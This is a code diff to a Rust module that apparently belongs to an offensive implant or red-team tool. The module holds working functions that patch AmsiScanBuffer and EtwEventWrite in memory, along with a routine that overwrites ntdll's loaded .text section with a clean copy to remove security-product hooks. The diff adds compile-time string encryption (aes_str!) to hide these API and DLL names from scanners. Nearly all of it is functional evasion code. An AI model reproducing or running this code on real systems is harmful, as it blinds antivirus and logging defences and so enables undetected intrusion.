@@ -14,13 +14,15 @@
 //   mov eax, 0x80070057 ; E_INVALIDARG
 //   ret
 
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 #[cfg(target_os = "windows")]
 pub fn patch_amsi() -> Result<String, String> {
-    unsafe { patch_function("amsi.dll", "AmsiScanBuffer", &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]) }
+    unsafe { patch_function(&aes_str!("amsi.dll"), &aes_str!("AmsiScanBuffer"), &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]) }
 }
 
 #[cfg(not(target_os = "windows"))]
-pub fn patch_amsi() -> Result<String, String> { Err("Windows only".into()) }
+pub fn patch_amsi() -> Result<String, String> { Err(aes_str!("Windows only")) }
 
 // ── ETW Patching ───────────────────────────────────────────────────────
 // Patches EtwEventWrite in ntdll.dll to return 0 (STATUS_SUCCESS)
@@ -34,11 +36,11 @@ pub fn patch_amsi() -> Result<String, String> { Err("Windows only".into()) }
 
 #[cfg(target_os = "windows")]
 pub fn patch_etw() -> Result<String, String> {
-    unsafe { patch_function("ntdll.dll", "EtwEventWrite", &[0x33, 0xC0, 0xC3]) }
+    unsafe { patch_function(&aes_str!("ntdll.dll"), &aes_str!("EtwEventWrite"), &[0x33, 0xC0, 0xC3]) }
 }
 
 #[cfg(not(target_os = "windows"))]
-pub fn patch_etw() -> Result<String, String> { Err("Windows only".into()) }
+pub fn patch_etw() -> Result<String, String> { Err(aes_str!("Windows only")) }
 
 // ── Generic Function Patcher ───────────────────────────────────────────
 // Resolves `func` in `dll`, makes its first `patch.len()` bytes writable
@@ -55,7 +57,7 @@ unsafe fn patch_function(dll: &str, func: &str, patch: &[u8]) -> Result<String, 
         fn GetProcAddress(module: *mut std::ffi::c_void, name: *const i8) -> *mut std::ffi::c_void;
         fn VirtualProtect(addr: *mut std::ffi::c_void, size: usize, new: u32, old: *mut u32) -> i32;
     }
-    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    let page_execute_readwrite = crate::config::config().ffi_windows.page_execute_readwrite;
 
     let dll_c  = CString::new(dll).unwrap();
     let func_c = CString::new(func).unwrap();
@@ -67,8 +69,8 @@ unsafe fn patch_function(dll: &str, func: &str, patch: &[u8]) -> Result<String, 
     if p.is_null() { return Err(format!("{} not found in {}", func, dll)); }
 
     let mut old = 0u32;
-    if VirtualProtect(p, patch.len(), PAGE_EXECUTE_READWRITE, &mut old) == 0 {
-        return Err("VirtualProtect failed".into());
+    if VirtualProtect(p, patch.len(), page_execute_readwrite, &mut old) == 0 {
+        return Err(aes_str!("VirtualProtect failed"));
     }
 
     ptr::copy_nonoverlapping(patch.as_ptr(), p as *mut u8, patch.len());
@@ -108,13 +110,15 @@ pub fn unhook_ntdll() -> Result<String, String> {
         fn CloseHandle(h: *mut c_void) -> i32;
     }
 
+    // OS-fixed (winnt.h) values with no typed-config mirror stay const.
     const GENERIC_READ:          u32 = 0x80000000;
     const FILE_SHARE_READ:       u32 = 1;
     const OPEN_EXISTING:         u32 = 3;
     const PAGE_READONLY:         u32 = 2;
-    const PAGE_EXECUTE_READWRITE:u32 = 0x40;
     const FILE_MAP_READ:         u32 = 4;
     const INVALID_HANDLE: *mut c_void = -1isize as *mut c_void;
+    // PAGE_EXECUTE_READWRITE is mirrored by the typed FFI config.
+    let page_execute_readwrite = crate::config::config().ffi_windows.page_execute_readwrite;
 
     #[repr(C)]
     struct ImageDosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }
@@ -127,31 +131,31 @@ pub fn unhook_ntdll() -> Result<String, String> {
     }
 
     unsafe {
-        let ntdll_name  = CString::new("ntdll.dll").unwrap();
+        let ntdll_name  = CString::new(aes_str!("ntdll.dll")).unwrap();
         let loaded_base = GetModuleHandleA(ntdll_name.as_ptr());
-        if loaded_base.is_null() { return Err("ntdll not loaded".into()); }
+        if loaded_base.is_null() { return Err(aes_str!("ntdll not loaded")); }
 
-        let path    = CString::new("C:\\Windows\\System32\\ntdll.dll").unwrap();
+        let path    = CString::new(aes_str!("C:\\Windows\\System32\\ntdll.dll")).unwrap();
         let h_file  = CreateFileA(path.as_ptr(), GENERIC_READ, FILE_SHARE_READ,
                                   ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
-        if h_file == INVALID_HANDLE { return Err("CreateFileA failed".into()); }
+        if h_file == INVALID_HANDLE { return Err(aes_str!("CreateFileA failed")); }
 
         let h_mapping = CreateFileMappingA(h_file, ptr::null_mut(), PAGE_READONLY, 0, 0, ptr::null());
         if h_mapping.is_null() {
             CloseHandle(h_file);
-            return Err("CreateFileMapping failed".into());
+            return Err(aes_str!("CreateFileMapping failed"));
         }
 
         let clean_base = MapViewOfFile(h_mapping, FILE_MAP_READ, 0, 0, 0);
         if clean_base.is_null() {
             CloseHandle(h_mapping); CloseHandle(h_file);
-            return Err("MapViewOfFile failed".into());
+            return Err(aes_str!("MapViewOfFile failed"));
         }
 
         let dos = &*(loaded_base as *const ImageDosHeader);
         if dos.e_magic != 0x5A4D {
             UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
-            return Err("Invalid DOS header".into());
+            return Err(aes_str!("Invalid DOS header"));
         }
 
         let nt_off          = dos.e_lfanew as usize;
@@ -179,7 +183,7 @@ pub fn unhook_ntdll() -> Result<String, String> {
 
         if !found {
             UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
-            return Err(".text section not found".into());
+            return Err(aes_str!(".text section not found"));
         }
 
         let loaded_text = (loaded_base as *mut u8).add(text_rva as usize);
@@ -187,10 +191,10 @@ pub fn unhook_ntdll() -> Result<String, String> {
 
         let mut old_protect = 0u32;
         if VirtualProtect(loaded_text as *mut c_void, text_size as usize,
-                          PAGE_EXECUTE_READWRITE, &mut old_protect) == 0
+                          page_execute_readwrite, &mut old_protect) == 0
         {
             UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
-            return Err("VirtualProtect failed on .text".into());
+            return Err(aes_str!("VirtualProtect failed on .text"));
         }
 
         ptr::copy_nonoverlapping(clean_text, loaded_text, text_size as usize);
@@ -207,7 +211,7 @@ pub fn unhook_ntdll() -> Result<String, String> {
 }
 
 #[cfg(not(target_os = "windows"))]
-pub fn unhook_ntdll() -> Result<String, String> { Err("Windows only".into()) }
+pub fn unhook_ntdll() -> Result<String, String> { Err(aes_str!("Windows only")) }
 
 #[cfg(test)]
 mod tests {
